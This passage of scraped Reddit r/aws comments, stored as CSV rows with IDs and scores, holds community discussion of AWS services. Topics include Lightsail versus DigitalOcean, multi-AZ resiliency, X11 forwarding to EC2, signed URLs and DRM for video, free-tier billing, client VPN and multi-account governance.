https://aws.amazon.com/blogs/networking-and-content-delivery/accessing-private-application-load-balancers-and-instances-through-aws-global-accelerator/",1.0
g7rfddx,j4whk6,Thank you.,1.0
g7rfhr9,j4whk6,"So far, since I don't want to use a load balancer since I wouldn't be load balancing anything because I have a single server, it looks like aside from using a Lamda function to update the security group, there is no other way to keep the webserver private.",1.0
g7oaaaw,j4vzw5,Sadly no not at this time.,2.0
g7ojlsx,j4vzw5,No,2.0
g7m7j8o,j4s7y4,You use it when digital ocean goes out of business...😎,34.0
g7ok0r3,j4s7y4,Is that experience or based on something in an article that can be shared?,1.0
g7omrc8,j4s7y4,"I’ll write a medium article for you if that helps you believe it 

Or you can acknowledge that low yield VMs with digital ocean has been around for longer and AWS just wanted to corner the market that DigitalOcean perfected.",7.0
g7orfez,j4s7y4,"Perhaps there is a strong sub market for single click server deployments and tear downs like DO, which offers extremely low entry barrier for developers wanting to prototype quickly, etc.",2.0
g7ouhmz,j4s7y4,"Their Spaces product is really awful though. Although it's only one of their products, it makes me distrust the way DigitalOcean handles things as a whole.

* They suddenly disabled creating Spaces in the region all our infrastructure is in, so our infra is now spread between regions.
* Last month, they planned maintenance with a window of 55 hours during a workweek.
* The AMS3 Spaces have an upload limit of 270GB per 24 hours, then it'll throttle to 1MB/s for 24 hours.
* We kept getting 503s when we were definitely below the rate limit.
* They provide a CDN for Spaces but it doesn't support HTTP/2

All experiences I've had with DO support were also really bad. It's only the marketing that makes them look comparable to the bigger cloud providers.",1.0
g7ov2jk,j4s7y4,"I think their point was DigitalOcean’s bread and butter is VPSes, which I’m not sure you’ve disproved. It’s less so their marketing and more their experience.",2.0
g7pd0vo,j4s7y4,I see now. I just really needed to vent somewhere. Many of those problems appeared when we expected them the least.,3.0
g7pd9o5,j4s7y4,That’s definitely fair and it’s all news to me,1.0
g7pkigw,j4s7y4,Spaces IMO is their stab back at light sail,1.0
g7mmi9h,j4s7y4,"Doesn't mention that LightSail has inbound firewalls (no outbound though). Also doesn't mention LightSail ""distributions"" (CloudFront).",8.0
g7nuofd,j4s7y4,"The article mentions they are probably t-series under the hood, however AFAIK all t3 types come with 2 vCPUs, whereas lightsail only has 1 for the cheaper types  (FYI same as DigitalOcean).

So t3.micro/small EC2s can offer more bang for buck (obv. more effort maintenance-wise)",4.0
g7op9ao,j4s7y4,"Might be true but EC2 also requires spending more bucks for some things. Check how much the bandwidth costs for the same EC2 instance that's included free in the Lightsail instance price. EC2 offers high flexibility and performance but fluctuating cost, Lightsail offers bargain basement pricing and performance that might fit the budget nicely for some uses.",1.0
g7pqtl1,j4s7y4,"They're definitely t-series.

Lightsail includes your EBS volume and your network transit, which isn't nothing, too. 

And there's no additional maintenance really. Lightsail gives a pretty, simplified interface to EC2 functionality. You still gotta do the maintenance.",1.0
g7lz1iy,j4s7y4,"Sucks that Lightsail doesn’t support SGs as Digital Ocean has Cloud Firewalls.

Didn’t know about the managed databases. I thought you had to use RDS.",2.0
g7m7gaw,j4s7y4,"Yeah, I think they introduced managed databases pretty recently. Lightsail has most things that one would need to get an application up and running.",1.0
g7opjl4,j4s7y4,"What's an SG? Lightsail has a web firewall. I also use the built-in OS firewall as an additional protective measure, redundancy.",1.0
g7ot3kc,j4s7y4,Security Groups. You’re right. Not sure why the article didn’t mention the web firewall. Regardless SGs are a lot more powerful and have outbound rules.,1.0
g7o489h,j4s7y4,"The bandwidth price difference is incredibly unfair to ""paying customers"" and offensive to my current AWS bill.",2.0
g7km4ay,j4ohcp,"The key words in the question are ""at least"".  Region is always an option (with capability and cost kept in mind) but the AWS certs love adding small words that specify the answer.  Things like most cost effective and most resilient modify which answer should be given.

In this case, the least effort needed to achieve resiliency is multiply AZs.",48.0
g7koda4,j4ohcp,"The way we’re encouraged to write questions emphasizes using these keywords to create proper distractor answers that a probably but not the most correct. 

Otherwise most questions, especially on higher level exams, would become way too easy with obvious wrong answers or much more difficult and full of long form scenarios.

This is public info as part of the SME training on the aws.training site fwiw",15.0
g7km9ly,j4ohcp,**at least** in different AZs,12.0
g7kmf0h,j4ohcp,"The risks for an entire region being impacted are minimal whereas there are some things that are more difficult to accomplish across regions rather than across availability zones, as well as potential cost considerations.   I think zones is clearly the better answer on this one.

Also “at least” is critical to the question.",7.0
g7kni5o,j4ohcp,I see i see i get you now,3.0
g7lvayl,j4ohcp,"Yeah they're wanting you to say AZ since the question is basically ""what's the minimal fault tolerance you can do?""",1.0
g7lx36b,j4ohcp,"In addition to the “at least”, what hasn’t been mentioned here is that both EC2 and RDS, offer native multi AZ support, out of the box.  This is important to the question because you need to match the failover (disaster recovery) capability with that of the services in question.  

You can of course also setup multi region active/active or active/passive with both EC2 and RDS, but it’s more difficult and costly and AWS doesn’t necessarily push such a setup for all use cases (even in production) simply because regional outages aren’t frequent and they know many teams are not going to be able to implement all of that. 

If the question called out services that are not AZ specific (eg DynamoDB), you’d need to know that you physically can’t spread your Dynamo table over multiple AZ’s.",1.0
g7ny5km,j4ohcp,"Regional outages are pretty rare - AZ level ones arent that uncommon. Also, there are manyy legal reasons you might not be able to distribute infrastructure across regions - thtere arent any that I can think of that prevent you distributing across a single region.

&amp;#x200B;

I dont know where RDS is at now, but I'm not sure if a multi-region synchronous replicatiton is a thing? Asynchronous, sure.",1.0
g7ov3m9,j4ohcp,well that's the theory.  then the reality of IAM &amp; dynamodb outages :),1.0
g7momvw,j4ohcp,"The answer is zonal. Please understand that a region is exactly that: several datacenters in a general area. 

Regions should be used to deliver a better experience to your customers depending where they are.",-1.0
g7kjkgb,j4nua5,"You're using dimensions the wrong way. Dimensions are to assign the metrics to something granular like an instance ID.

Your metrics counts the passengers, so passengers are not your dimension. Your dimension is more like the number of the train/route. So you can see the passengers on each train/route separately.",8.0
g7l4t8x,j4nua5,"You're very close to trying to use CloudWatch as a general purpose database, which it's never going to be. You may already be there. While there may be some very convoluted way to capture individual passenger data in the way you're hoping, given the way that CloudWatch Metrics pricing works, you're likely going to end up paying quite a bit.

CloudWatch may be a good place to capture dimensions like line and train number, and metrics like passenger count, trip time, total delay, etc. It's not going to work well for names.",6.0
g7nijfe,j4nua5,"Thats where a Database Like DynamoDB would shine. 

For CloudWatch, I would recommend to store only low-cardinality dimensions when using custom metrics given the pricing model. 

Ask yourself what the use case for those metrics is. Alarming? Prefer aggregated metrics per train. Dashboarding? Why need to get each passenger individually on the Dashboard?

If your use case is to analyze with aggregations, filters etc use DynamoDB, Firehose, Athena and/or IoT. With streaming (Dynamo, Firehose) you can later add the metrics to CloudWatch and decouple your System when a new ""Status Update"" happens.

In this case, you could use the train name as a Dimension and add metrics like passenger count and speed. 

For individual passengers (high-cardinality Dimension) Store this data in a Database. 

Last tip: Take a look at the IoT Services which are built for use cases where ""Things"" are sending regular status updates and metrics and provide analytics capabilities :)",2.0
g7odj3a,j4nua5,"Ahh thanks everyone.  

I was hoping to create graphs where if you mouse over the data points, it'd pop out a list of passengers.  I think I understand what dimensions are for now.",1.0
g7k250d,j4kmnq,"forward your x session

ssh -Xt name@host

xeyes",25.0
g7klc9z,j4kmnq,This led me down the right rabbit hole and I got it setup. I ended up having to just make a .Xauthorize file on my local machine and add the -X to the ssh command. Thanks.,5.0
g7kqj45,j4kmnq,"This is one of those rites of passage like replacing back references in vi. Or piping stuff through sed and awk.

Congratulations padewan, you are now a learned acolyte.",8.0
g7l29tw,j4kmnq,It was all thanks to your guidance. 🙏🏼,4.0
g7k9g32,j4kmnq,You can run Jupyter on that machine and access it via HTTPS.,6.0
g7k7134,j4kmnq,"ssh with -X  for simple forwarding or -Y for secure forwarding. Some things need -Y, like openGL plugins.

Once you're logged in to the other end you can't sudo to another user without doing an xauth list and echo $DISPLAY before changing user. Then xauth add what the list command gave you for the display and set the display variable.

(From memory)",3.0
g7l97kl,j4kmnq,Have you considered running Ubuntu AWS Workspaces?,2.0
g7k6bqr,j4kmnq,Does the script output a file with a graph or is it a notebook? You can run jupiter from the ec2 if it's a notebook,1.0
g7kk8lo,j4kmnq,"If just matplotlib graphs, the easiest way to visualize those is to run a jupyter notebook server on your EC2, run your python in a notebook  and access your notebook in a browser.",1.0
g7kq5dp,j4kmnq,Ask me again on Monday. I’ve got some scripts somewhere,1.0
g7kila1,j4kmnq,"X11 is pretty bad over anything that isn't a LAN. I recommend setting up a VNC server on your machine. VNC has no inherent security though, so you need to pipe VNC through an SSH forwarding connection.",1.0
g7kh0g1,j4kmnq,You can connect with a graphical tool like FileZilla: [https://stackoverflow.com/questions/16744863/connect-to-amazon-ec2-file-directory-using-filezilla-and-sftp](https://stackoverflow.com/questions/16744863/connect-to-amazon-ec2-file-directory-using-filezilla-and-sftp),0.0
g7j4tr7,j4gm7o,"If you figure it out, let Google know. They’d love to do this for Youtube, god knows they’ve tried .. ;-)

You could look into DRM’ing the videos, but it’s a fairly large jump in complexity.",12.0
g7j0xkl,j4gm7o,"Anyone who has access to stream the video can also download it - worst case they just take their phone and record the screen while watching it. This specifically is almost impossible to prevent (e. g. you would have to require that someone you know is always in the same room when they watch a video so that person can ensure your no-recording policy).
But companies like Netflix and Amazon have to deal with similar problems. One thing I have seen is to only ever stream parts of the video, so downloading the full video takes as long as watching it.
But overall it’s a really hard problem.",6.0
g7j9nf7,j4gm7o,"FWIW I've implemented signed URLs and signed cookies and all that when hosting content on CloudFront backed onto S3, but nothing is 100% proof against downloads.",2.0
g7opfs8,j4gm7o,You could look into using MediaPackage for origination ([https://docs.aws.amazon.com/mediapackage/latest/ug/vod-content.html](https://docs.aws.amazon.com/mediapackage/latest/ug/vod-content.html)) and using it's DRM capabilities ([https://docs.aws.amazon.com/mediapackage/latest/ug/data-protection-encrypt.html](https://docs.aws.amazon.com/mediapackage/latest/ug/data-protection-encrypt.html)).,2.0
g7j4zv4,j4gm7o,"The real question is, what is your budget? If you can't fork over the cash for DRM to secure the videos then you are running a fools errand. Any direct link to a file in S3 will enable someone to download the entire thing. 

I'd dig into what kind of media server you can use that has usable DRM within modern browsers.",2.0
g7jncz1,j4gm7o,"Maybe you could have some logic that looks at the users activity before releasing a signed url. If they have consumed x ours of content but it’s only x-4 of time, deny and block the account",1.0
g7swr37,j4gm7o,"In addition to signed/tokenized URLs to content, you could use clear-key encryption to encrypt the content (SAMPLE-AES w/ HLS) and then control access to the decryption keys. This would add an additional layer of protection without full-fledged DRM system and I know that this will thwart youtube-dl. It's called clear-key because the keys do have to be exchanged ""in the clear"" as opposed to in a trusted execution environment like DRM, but it's way cheaper to implement.

Essentially you  create AES128 data keys with KMS, use those data keys to encrypt in mediaconvert, control access to the data keys living in S3 alongside the content just  like you would the rest of the media. The key location lives in the manifest.",1.0
g7ps3yc,j4gezr,"Is there a specific question or are you looking for general guidance?

Naively I would try something like this:

 * Setup a CF + APIGW +  R53 for *.chatbot.com (use this for your tenet stuff)
 * Setup a CF + APIGW+ R53 for chatbot.com (use this for your non-tenet stuff)

Custom domains a little more involved, you will need to set up the CF, but you might be able to get away with using a single APIGW depending on how you configure your Lambda@Edge. Otherwise I'd just set up an APIGW for every tenet (this might become a management problem depending on how many tenets you have). 

AWS has *SaaS Factory* which might be helpful: https://aws.amazon.com/partners/saas-factory/

You might also consider using *AWS Solutions Constructs patterns* as a starting point: https://aws.amazon.com/solutions/constructs/patterns/",1.0
g7iffmq,j4eebh,If you don’t know that some months have 31 days then you shouldn’t be using AWS.,15.0
g7ig89g,j4eebh,If you can't be constructive then you shouldn't comment on reddit.,-5.0
g7igzme,j4eebh,Agreed,2.0
g7p2s7n,j4eebh,It was constructive. AWS isn’t a toy. This is how people get $10k bills and come crying here about it.,1.0
g7p7tmh,j4eebh,"Lol 10k bills, OK buddy",-1.0
g7pb3r6,j4eebh,"You must be new here.

https://www.reddit.com/r/aws/comments/g1ve18/i_am_charged_60k_on_aws_without_using_anything/",2.0
g7pc0fr,j4eebh,Holy ****. Still some friendly support would have been better than being so blunt.,1.0
g8nyh0j,j4eebh,"What was the reason for being charged $60k. Was his account hacked? 

And how can I prevent myself from something like this?",1.0
g8nz0c4,j4eebh,By spinning up a multi-az database that cost over $16/hr and ignored the billing alerts for several months.,1.0
g8nzfep,j4eebh,"And what if I use only cheap, micro EC2 instances?",1.0
g8nzpoz,j4eebh,Just don’t leak your access keys or assign an EC2 role to the instance that has permission to launch stuff and you should be fine. Look at the bill once a day for a few weeks to make sure it looks the way you expect.,1.0
g7iub5q,j4eebh,"&gt; On Amazon EC2 page, it says 750 hours/month, but a month only have 720 hours (24x30=720). So, what does 750 means?

AWS billing is time based. You have 750 hours of free usage. it means you can launch as much free-tier permitted instances and as long as you're within the 750 hours. If it means one instance running for 24hrs for a month or two instances running 24hrs for half a month or 4 instances running 6 hours for a month, these all come up to 750 hours and you dont get charged.

&gt; How much storage will I get with EC2? Where my website's files/media will be stored? Do I need to install another software (except EC2) to store my files?

The free tier instances are EBS only, which means you are charged separately for storage. You can provision as much as you want, based on your needs and AWS limits and you will be charged accordingly.",2.0
g7if2uc,j4eebh,"Some months have 31 days, and you can run multiple instances in parallel, which would lead to more hours per hour to be consumed.

Storage amound is based on configuration.",3.0
g7in55c,j4eebh,Look up Wordpress and Lightsail.,4.0
g7idyny,j4eebh,"You may also spin up a bunch of ec2 in the free tier limit. Like 2 or more until 750 hours usage. You arent limited to one instance free tier

You also can use S3 to store all your static contentent",1.0
g7ifmf6,j4eebh,"It looks like you can get 30gb of ebs storage free for a year. 

You should allocate a 30gb ebs volume and use that for your database and wordpress files.",1.0
g7iylcu,j4eebh,"ec2 free tier lasts for 1 year once you start, so be aware of that as well",1.0
g7iypvi,j4eebh,"I’m current doing Adrian Cantrill’s Course and you build a VPC, deploy an EC2 instance, setup and configure a Wordpress site multiple times throughout the course... I can now do the entire thing end to end in a couple minutes using cloud formation templates... check out the course if you want to actually learn AWS.

If not as someone else mentioned- look at AWS Lightsail ... you pay a little more but you can get Wordpress as a service.",1.0
g87e8kz,j4eebh,Lightsail can end up quite a ton cheaper because of the free 1000gb network bandwidth. If you used an ec2 instance and sent out 1000gb you'd pay $100 for it.,1.0
g7imiqt,j492fw,"Ha! At least you're getting communication from them. I got an email 6 weeks ago saying they will schedule an interview. Doesn't respond to emails, doesn't respond on linked in.

From what I gather, Tech U is run by its own little recruiting department and it seems highly disorganized.",2.0
g7q6blc,j4aqur,"If this is a new user pool, responses that [hide user existence](https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-pool-managing-errors.html) are now the default. That’s probably why you aren’t getting the documented response. Cognito is very under-resourced so they probably haven’t been able to review all the documentation since releasing that feature.",1.0
g7hk61l,j496wl,"AWS has an OpenVPN service called client VPN endpoint. 
You can also link all of your accounts VPCs via transit gateway in shared account instead of peering so that all become accessible via VPN. If you decide to use SAML or AD authentication for the VPN endpoint you can then also have granular access controls by mapping CIDR ranges of VPCs or Subnets to user groups via authorization rules. 

We also use AWS VPN client (required for SAML support)

It's something we use and it works really well. I can provide more details if you are interested.",4.0
g7ht76q,j496wl,"Aws vpn server is really expensive. We use openvpn from yum for free.

I haven't looked into HA but i imagine a NLB and sharing the certs between multiple servers would do the job reasonably well.

Do the ""proper"" ha solutions replicate the state across nodes. (Like internal IP)

SAML support is an interesting one, I hadn't considered before. It might save me some hassle reissuing certificates.",1.0
g7htnej,j496wl,Expensive is relative to your environment. For example we have an agreement not to use EC2 instances because it's expensive to maintain and run them in a way that's expected in our environment. I am not talking just about AWS prices.,3.0
g7jkfle,j496wl,What do you connect to in AWS if you have no EC2s???,1.0
g7mxglk,j496wl,Elasticsearch domains provisioned into private subnets. HTTP Services hosted on ECS Fargate containers and fronted by ALBs also running in private subnets.,1.0
g7j16d1,j496wl,"Thanks, sent a DM.",1.0
g7hvang,j496wl,"OpenVPN latest access server binaries have built-in HA support through centralized storage in a mysql RDS and dynamic licenses that allow you to use infea-as-code (such as Chef/OpsWorks) to provision multiple servers and ""join"" them together as a cluster.

Just look up the documentation.",3.0
g7hqc94,j496wl,I have heard good things about using tailscale,1.0
g7hq6t2,j46szl,"Without diving deep, what sets this apart from “amplify add hosting”?",4.0
g7ine29,j46szl,"Amplify add hosting adds a back end API service using GraphQL (or ReST) along with the associated queries and mutations, database, security, etc. Parima is setting up a front end static host including S3, CloudFront, Route53, certificates, and so forth. So Parima's goals are not the same as the Amplify add backend. However, Amplify does do what Parima is doing with the static hosting, certificates, Route53, etc. And moreover, you get more features from Amplify, even in the case that you don't take advantage of the back end setup, like feature branch deployment and ci/cd etc. 

So, perhaps to your point, Amplify does everything that Parima does plus a lot more and Amplify looks like it does it a whole lot better.",3.0
g7ithn2,j46szl,"The idea we are going for with Parima is to provide a simpler process that only creates the resources required for static site / spa framework hosting.

It's also one-click, so is well-suited to devs who aren't looking to learn the feature set of Amplify at this point.",3.0
g7jbgz7,j46szl,"Yeah, right on. I'm cool with that. Options are good.",2.0
g7io6de,j46szl,It looks like this uses all the same services as amplify does (except for using the s3 cli instead of connecting to github/gitlab/bitbucket). Having used both I was able to set a static site with a custom domain in 1 click and 5 minutes rather than clicking around the amplify console and digging through the docs.,3.0
g7hw9f9,j46szl,"how much does the hosting costs, using all the services mentioned?  
Is it worth the time and effort to set it up financially, like hosting sites for business clients and getting away cheaper than with any other webhosting service, or is it rather a DIY just for fun thing?",2.0
g7isahk,j46szl,"The main value of something like this is that there is no infrastructure beyond the website for you to maintain (AWS maintains it for you), plus it using AWS's top-notch hardware and SLA. You don't have to muck around updating PHP or Apache and cannot forget to renew certs (as it's automatic).

Furthermore, if your client has a sudden massive increase in traffic, the website won't fall over.

Cost-wise it depends mostly on CloudFront bandwidth usage and (to a much less extent) S3 bucket usage. Check out the cost of those services.",5.0
g7zbfbk,j46szl,"I'll take a look, thanks!",2.0
g7ivccc,j46szl,"It's great for at least two common use cases:

1) Prototype hosting to test and share, which might just use the BLAH.cloudfront URL

2) Hosting production sites for clients (or personal sites) for less money than creating separate virtual servers, and less hassle than running a multi-tenant VM.

But I'm sure there are others. :)

Cost would depend on AWS usage and Route53 DNS alone, so most low-to-medium traffic static sites could be run for USD$1.50-4.00 a month.",2.0
g7zbgtv,j46szl,"Cool, that's a number to consider haha   
Nice!",3.0
g7ip1bv,j46szl,Sounds like someone has re-invented Amplify.,2.0
g7gq8b3,j44ydu,"Keeping it simple but adding some protection: If you mean literally a public bucket url that isn’t even a signed url, start by locking it down and generating signed urls via cloudfront, only access should be from cloudfront origin. You can time bound the signed url.  If the client accesses from a corporate network (registered IP space) you use cloudfront signed url policies to also lock it down to their IPs or if the user is making the request via a web form/application you could use their current IP. Essentially you have a time bound, signed url, with an IP ‘authentication’.  

Getting to user authentication, Cognito can do this for you https://aws.amazon.com/blogs/networking-and-content-delivery/authorizationedge-using-cookies-protect-your-amazon-cloudfront-content-from-being-downloaded-by-unauthenticated-users/",3.0
g7gqhpf,j44ydu,"You could create a system that uses cloudfront signed urls to allow downloads from a private s3-bucket. I’m not sure of a turn-key solution in aws already though, perhaps someone else will have more insight.",1.0
g7gtmuu,j44ydu,As a wildcard suggestion you could put a Lambda authoriser function in place. Depends on how important that data is etc.,1.0
g7l2xgt,j44ydu,"You can create a bucket and an IAM user for that bucket, then write a script that uses the aws cp command in the AWS CLI on the client's machine to download it. You'd need to give them a credentials file to accomplish this.",1.0
g7h7ju4,j44l6e,"You could use SSM and tunnel the backend private webserver port. No VPN required but requires AWS cli commands and IAM accounts, and th SSM agent installed on the EC2. Would need an EC2 if the backend is serverless",1.0
g7iyxk5,j44l6e,"you can still ssh / rdp to private instances without a vpn by using ssm with port forwarding. requires the cli and a plugin, but it's easy. a vpn would be terribly expensive",1.0
g7j3vwf,j44l6e,"It’s not just for ssh access, it’s primarily to allow staff access to the web servers on those machines",1.0
g7k6s2w,j44l6e,you can forward any port,1.0
g7ka32j,j44l6e,"Oh for sure, it’s more that this isn’t particularly user friendly for our non-technical staff who require access to our systems in a way that doesn’t leave them open to the world",1.0
g7go08a,j42i75,"Master billing account with no workloads.

SSO in the master account, or seperate central IAM account, and roles in all other accounts. Enforce MFA with assume roles to child accounts

Audit account, send CloudTrail, flow logs, config etc to it. Lock it down to RO unless as root account

SCP - disable removal of CloudTrail across all accounts, disable delete on S3 object in audit account

MFA root accounts, cloudwatch alarms on root usage

Config to enforce or report tagging and other compliance .

Standard vpc template via stack/stackset
Scheduling lambda

Typical remediation items I do for clients as part of a funded WAR",17.0
g7h3ml6,j42i75,"HEY AWS, MAKE AN API FOR CONTROL TOWER ALREADY!",7.0
g7jpvpp,j42i75,"Also, thanks for all the email spam whenever I create an account in the account factory! I totally need to be welcomed to AWS repeatedly.",2.0
g7j04wd,j42i75,I can’t believe they still haven’t done that. We’ve had to do a bunch of workarounds for it. Control Tower’s account factory wizard also sucks. Very basic VPC configuration wizard and doesn’t protect you from overlapping CIDRs. So to automate VPC attachments to TGW we had to build our own orchestration 😞,1.0
g7gkrpo,j42i75,Stack sets.,3.0
g7gl82s,j42i75,"Control Tower automates a lot of the AWS-recommended best practices for multi-account management. Sets you up with an account vending machine, AWS SSO all configured, a few core accounts meant for centralised governance (security and logging, for instance), recommended SCPs and account guardrails (StackSets deployed across all accounts with best practices in mind).

Just be mindful that it's a quite heavy and opinionated deployment, so if your requirements are very specific you may find that customizing its presets is a headache (not impossible, though, I've done it successfully before).

One additional note I'd give is that AWS SSO in my opinion is pretty much the best AWS-native way to handle access across accounts at the moment. Integrating it with AD through SCIM is painless and very convenient in my experience.

edit: Ah, scheisse, just noticed your note about it being too late for Control Tower. Two options I see :

1) It's possible to just start another root account, do the Control Tower setup there, then move your accounts over. If you're so inclined, it might give you a long-term managed solution in exchange for some short-term pain. 

2) Use [this template](https://github.com/aws-samples/aws-account-vending-machine) to deploy your own Account Vending Machine. Managing it yourself might be a pain, but it will allow you to centralize your standards across accounts. Enable some Org-wide CFN StackSets in your root account for your guardrails and that should give you the bare minimum to keep things under control.",2.0
g7hkxdr,j42i75,"AWS Control Tower supports onboarding existing accounts/organizations too finally.

https://docs.aws.amazon.com/controltower/latest/userguide/existing-orgs.html",1.0
g7oulpf,j42i75,"You probably want to be under 10 accounts, separated by master (billing) + environments (dev,qa,prod,etc.).  It's a good idea to implement CICD for everything but it can be quite complicated.  You might want to start with CICD only for VPCs + routing + other core services via something like Terraform.",1.0
g7xffdv,j42i75,"I've been working with large CloudFormation deployments and AWS Organizations and tried both AWS Landing Zone and Control Tower. I wasn't content with the solutions available and ended up building a tool called [Takomo](https://takomo.io) to parameterize and deploy CloudFormation stacks across organization accounts. You can use it to handle smaller deployments that do not require organization as well.

Here are some of the key features of the tool:

\- Deploy stacks across multiple regions and accounts with a single CLI command.

\- Review changes to stack parameters and the template body before proceeding with the deployment.

\- Define dependencies between stacks to ensure the correct deployment order.

\- Resolve parameter values at deployment time, e.g., read values from outputs of other stacks or some other resources. You can implement custom parameter value resolvers with javascript.

\- Use loops, if-conditions, and other features of Handlebars templating engine in your stack templates.

\- Configure custom logic to be run on different deployment phases, e.g., run a script before a stack creation or update.

\- Manage AWS Organization and its member accounts, organizational units, and authorization and management policies. Create new member accounts and deploy stacks to them.

&amp;#x200B;

A few companies are already using Takomo, but documentation and organization management still needs a bit more development. Nevertheless, you should be able to build an organization similar to that created by Control Tower, and I'm planning to implement an example project showing how to achieve that.

Of course, any feedback and ideas are welcome.",1.0
g7iamlt,j415wf,"Could you add a little more information on the problem?

Why are you returning 1MB+ of data?
Could you offload this data to S3 and just have metadata in dynamodb?
Does the user or application need all that data up front?

Not knowing more it’s hard to help. But I’m guessing you are not designing your tables for your access patterns first",4.0
g7hqmtf,j422w2,"whoa, so cross account S3 uploads can finally no longer be a minefield! I've run into that half a dozen times by now. sweet",12.0
g7g3snm,j422w2,Nice! This was long overdue.,7.0
g7h70lu,j422w2,Great to see this. The bucket and object ownership thing bit me in the ass a month ago.,7.0
g7hjc8u,j422w2,"&gt; Object Ownership

You can already create a resource policy to force `--acl bucket-owner-full-control`. Why was this needed?",4.0
g7hkt9j,j422w2,This is not a resource policy thing. This is changing the resulting object ownership for calls made with that ACL.,8.0
g7j3kw8,j422w2,"This change lets you reconfigure the bucket so that objects uploaded with that ACL will be owned by the bucket owner instead of the uploader. Without this you end up with objects that have a different owner from the bucket, which blocks cross-account access unless the object's ACL allows it to each requesting account. Uploaders basically never do this, so in practice cross-account access was usually impossible.

The huge change here is that you can force new objects to be owned by the bucket owner, which means cross-account access is just a bucket policy issue.

This allows for use cases like CloudTrail/Config data cross-account access, which needed workarounds before. Something like doing an Athena query from one account on your CloudTrail data in another is now much easier.",3.0
g7m9mak,j422w2,Because it’s a pain and results in many support cases,1.0
g7rb54k,j422w2,"Still waiting on an S3 VPC Endpoint Policy Condition to assert that a bucket belongs to a given account (or org). Without that, S3 VPCE Policies need to enumerate each individual bucket name, which won't work if you have too many buckets (in order to prevent data exfiltration through the S3 VPC Endpoint).",2.0
g7gbq34,j417un,Last time i used quicksight (2ish years ago) I just added all the tables and then had joins in my query. Worked fine.,1.0
g7gc8wc,j417un,So you added each table as a individual data source?,1.0
g7ggelc,j417un,"Again, it’s been a while, but i think you add the whole db as a data source and then you can query the individual tables.",1.0
g7goc0w,j417un,"Choose a single table when you create the dataset.  After creating, open the data set and edit.  If you are using SPICE you can drop your additional tables in and create the relationships",1.0
g7pq4gg,j417un,"Thank you! That makes sense and worked. It seems like I want to create multiple data sets vs. importing 30+ of my tables into a single data set and trying to map all the key relationships, right? I'm just learning QuickSight but looks like they want you to ""zoom in"" on a couple of tables at a time?",1.0
g7frohs,j3ue5u,"Honestly I'd play around with https://calculator.aws/

Don't forget data out of AWS costs, but into aws is free.",2.0
g7ft8hm,j3ue5u,"Roughly the price depends on how much ram, cpu and disk you want. And add 10% to the amazon prices for bandwidth n stuff.

If you're just using it for an actual person to login to, why run 24x7? The whole point of aws is you shut it down when you aren't using it and the cost is tiny (unless you give it hundreds of gbs of disk) 24x7 is a much bigger bill than 8x5.",2.0
g7g6vsu,j3ue5u,"can you schedule when it is able to be run or give my VA the power to start and stop it with out needing to log into the AWS console? I would love to be able to do what you said, but my VA is not techie at all  


My VA is going to be mostly just using the internet and working through Gsuite or 365, no apps probably except Chrome",1.0
g7jmiub,j3ue5u,"Id do it with an autoscaling group and scheduling on the ASG (which is easy to setup with a simple gui) 

One schedule 8am sets desired count to 1 and one at 18:00 sets desired to zero.

Only problem with that is that it terminates the instance each time rather than stopping it. So she'd need to reinstall chrome every day. Unless you wanted to make an AMI with Chrome preinstalled. You could also use that approach to add a non admin user account and some bookmarks.

The other way would be scheduled lambdas to start/stop. Pretty easy if you know what you're doing with the IAM role and a bit of python and boto3.

If it is the only instance then it is hard to get the startup/shutdown wrong! Even for tech incompetents :-) a short doc with some screenshots would cover it.",2.0
g7hkgyi,j3ue5u,"Have you considered WorkSpaces? There's hourly pricing that may make it cheaper.  
[https://aws.amazon.com/workspaces/pricing/](https://aws.amazon.com/workspaces/pricing/?nc=sn&amp;loc=3)

If you want barebones basic and you are not needing it to connect to other resources in a VPC, perhaps Lightsail? [https://aws.amazon.com/lightsail/pricing/](https://aws.amazon.com/lightsail/pricing/)",2.0
g7jydmp,j3ue5u,"I'd recommend looking at https://www.ec2instances.info rather than the official AWS tools, for the instance. Then use the AWS tools for others have linked like the calculator for storage ($0.10/GB/month) etc. The website I link gives you all the info about instances at a single glance, which is great for comparison.

For the smallest reasonable instance with 4GB RAM you're looking at $40/month. About the same if you instead go for Workspaces - https://aws.amazon.com/workspaces/pricing/",1.0
g7fok94,j3ylnu,Legally Mac OS only runs on Mac hardware,7.0
g7frhb0,j3ylnu,"Correct. The only ""cloud"" option I have ever seen for a Mac OS server were data centers that rented you a physical mac mini in a rack.",5.0
g7fksp7,j3ylnu,Nope. Linux and Windows only,2.0
g7htdnn,j3ylnu,"MacOS license prohibits from running it on non-Apple hardware, so you need a cloud provider that hosts literal Mac computers and AWS doesn’t do this.",2.0
g7if42z,j3ylnu,"Ironically enough, Apple is one of AWS's largest customers.",2.0
g7lm2h0,j3ylnu,We rent Mac-Mini space from a 3rd party cloud and have a site-to-site VPN to our AWS VPC where necessary (mainly for our build system).,1.0
g7fml9c,j3xpsq,"If you manage multiple customer workloads, I would strongly recommend using one AWS account per customer and manage them all with AWS Organizations. If you think managing multiple accounts would be a pain, I can assure you that managing effective isolation using IAM and VPCs alone will be even more of a pain. 

Restricting yourself to one account per customer means that your customer workloads are isolated by default, and you don't have to worry about their network spaces overlapping or other resource restrictions.  It gets a bit more complicated if you want workloads to talk to each other across accounts, but thats not hard to work out, and its more secure to manage that access on an 'as needed' basis rather than having to worry about securing every workload as its created.",5.0
g7fs3yu,j3xpsq,True. Everything would be scripted In terraform anyway. We would need peering connections to the account running our Zabbix monitoring though.,1.0
g7ftb3l,j3xpsq,"One thought about this approach - how do you manage logins for each account? We use One Login, but adding every account could get tedious.",1.0
g7fvg38,j3xpsq,"OneLogin has integration with AWS Single Sign On - [https://www.onelogin.com/partners/technology-partners/aws](https://www.onelogin.com/partners/technology-partners/aws)   


As part of your new account configuration via Terraform, you can configure SSO as a federated identity provider in IAM.",1.0
g7fdhwb,j3xpsq,"Why do you only get 5 EIPs? That is a soft limit which is easily raised with a service quota increase request. 

With TGW you have to worry about IP overlap issues. Does each customer get their own block or it is all the same?",3.0
g7hlrj7,j3xpsq,Seconded. Raise your EIP limit...,1.0
g7fosx4,j3xpsq,"Other commenters have addressed some bits, so I won't duplicate their points.

SSM requires 2 or 3 (depending on which documentation you look at and which SSM features you use) - ssm, ssmmessages, and ec2messages, from memory. If you only have an ssm endpoint, your instances can't be commanded, because part of the conversation uses the messages endpoints.",3.0
g7g3a2t,j3xpsq,"Make sure you create the endpoints for all the necessary services: https://aws.amazon.com/premiumsupport/knowledge-center/ec2-systems-manager-vpc-endpoints/

